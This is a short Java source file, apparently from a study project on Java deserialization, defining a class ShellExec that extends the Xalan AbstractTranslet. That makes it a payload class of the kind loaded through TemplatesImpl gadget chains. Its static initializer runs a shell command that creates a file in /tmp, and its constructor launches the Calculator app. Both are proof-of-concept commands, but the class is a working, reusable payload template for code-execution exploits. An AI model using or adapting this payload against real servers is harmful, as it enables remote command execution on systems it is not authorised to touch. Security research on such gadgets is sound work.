package JavaUnser;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class ShellExec extends AbstractTranslet{
    static{
        try {
            Runtime.getRuntime().exec("touch /tmp/nimade");
        }catch(Exception e){

        }
    }
    public ShellExec() throws IOException{
        Runtime.getRuntime().exec("open -a Calculator");
    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }
    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {
    }

    public static void main(String[] args) throws Exception {
        ShellExec t = new ShellExec();
    }

}